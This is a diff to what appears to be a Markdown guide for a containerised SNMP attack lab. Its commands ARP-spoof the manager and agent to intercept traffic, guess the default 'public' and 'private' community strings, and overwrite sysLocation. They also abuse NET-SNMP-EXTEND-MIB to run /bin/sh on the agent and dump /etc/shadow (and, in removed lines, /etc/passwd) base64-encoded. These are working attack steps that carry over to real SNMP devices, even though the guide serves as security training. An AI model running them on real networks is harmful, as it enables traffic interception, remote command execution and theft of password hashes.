@@ -76,7 +76,7 @@ Docker bridge networks behave like a switch: unicast packets between two contain
 
 Open three terminals.
 
-Terminal 1 - ARP spoof agent toward manager:
+Terminal 1 - tell the manager that the agent's IP is at my MAC address with unsolicited ARP:
 
 ```bash
 AGENT_IP=$(docker inspect snmp-agent --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
@@ -84,7 +84,7 @@ MANAGER_IP=$(docker inspect snmp-manager --format '{{range .NetworkSettings.Netw
 docker exec snmp-attacker arpspoof -i eth0 -t $MANAGER_IP $AGENT_IP
 ```
 
-Terminal 2 - ARP spoof manager toward agent:
+Terminal 2 - tell the agent that the manager's IP is at my MAC address with unsolicited ARP:
 
 ```bash
 docker exec snmp-attacker arpspoof -i eth0 -t $AGENT_IP $MANAGER_IP
@@ -117,9 +117,11 @@ Expected output:
 Manual equivalents:
 
 ```bash
-docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c public  snmp-agent 1.3.6.1.2.1.1.1.0
-docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c private snmp-agent 1.3.6.1.2.1.1.1.0
-docker exec snmp-attacker snmpget -t 1 -r 0 -v 1  -c public  snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -v 2c -c public snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -v 2c -c private snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -v 1  -c public snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -v 2c -c public snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -v 2c -c public snmp-agent 1.3.6.1.2.1.1.5.0
 ```
 
 ---
@@ -142,8 +144,6 @@ A single unauthenticated read dumps everything an attacker needs to plan the nex
 Manual equivalents:
 
 ```bash
-docker exec snmp-attacker snmpget  -v 2c -c public snmp-agent 1.3.6.1.2.1.1.1.0
-docker exec snmp-attacker snmpget  -v 2c -c public snmp-agent 1.3.6.1.2.1.1.5.0
 docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 1.3.6.1.2.1.25.4.2.1
 docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 1.3.6.1.2.1.6.13.1.3
 ```
@@ -164,9 +164,9 @@ Expected output:
 Manual equivalents:
 
 ```bash
-docker exec snmp-attacker snmpget  -v 2c -c public  snmp-agent sysLocation.0
+docker exec snmp-attacker snmpget  -v 2c -c public snmp-agent sysLocation.0
 docker exec snmp-attacker snmpset  -v 2c -c private snmp-agent sysLocation.0 s "Pwned by attacker"
-docker exec snmp-attacker snmpget  -v 2c -c public  snmp-agent sysLocation.0
+docker exec snmp-attacker snmpget  -v 2c -c public snmp-agent sysLocation.0
 ```
 
 ---
@@ -225,22 +225,9 @@ docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-a
   'nsExtendStatus."id"' = destroy
 ```
 
-### Dump /etc/passwd and /etc/shadow via SNMP (base64 encoded)
+### Dump /etc/shadow via SNMP (base64 encoded)
 
-Exfiltrate both credential files, base64 encoded to avoid SNMP string truncation.
-
-Dump `/etc/passwd`:
-
-```bash
-docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
-  'nsExtendStatus."passwd"'  = createAndGo \
-  'nsExtendCommand."passwd"' = /bin/sh \
-  'nsExtendArgs."passwd"'    = '-c "cat /etc/passwd | base64"'
-
-docker exec snmp-attacker snmpget -m +NET-SNMP-EXTEND-MIB -v2c -c public snmp-agent \
-  NET-SNMP-EXTEND-MIB::nsExtendOutputFull.'"passwd"' 2>/dev/null \
-  | awk -F'STRING: ' '{print $2}' | base64 -d
-```
+Exfiltrate both credentials, base64 encoded to avoid SNMP string truncation.
 
 Dump `/etc/shadow`:
 
@@ -251,6 +238,9 @@ docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-a
   'nsExtendArgs."shadow"'    = '-c "cat /etc/shadow | base64"'
 
 docker exec snmp-attacker snmpwalk -m +NET-SNMP-EXTEND-MIB -v2c -c public snmp-agent \
+  NET-SNMP-EXTEND-MIB::nsExtendOutLine.'"shadow"'
+
+docker exec snmp-attacker snmpwalk -m +NET-SNMP-EXTEND-MIB -v2c -c public snmp-agent \
   NET-SNMP-EXTEND-MIB::nsExtendOutLine.'"shadow"' 2>/dev/null \
   | awk -F'STRING: ' '{print $2}' | tr -d '\n' | base64 -d
 ```
@@ -259,7 +249,6 @@ Clean up both rows:
 
 ```bash
 docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
-  'nsExtendStatus."passwd"' = destroy \
   'nsExtendStatus."shadow"' = destroy
 ```
 
